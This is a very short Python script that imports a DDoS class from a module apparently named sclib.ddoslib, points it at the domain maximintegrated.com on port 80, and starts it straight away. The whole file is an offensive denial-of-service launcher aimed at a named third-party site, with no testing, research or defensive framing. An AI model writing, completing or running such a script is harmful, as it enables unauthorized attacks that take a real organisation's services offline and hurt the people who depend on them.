from sclib.ddoslib import DDos

def a3():
    ddos1 = DDos('maximintegrated.com', 80)
    ddos1.start()

a3()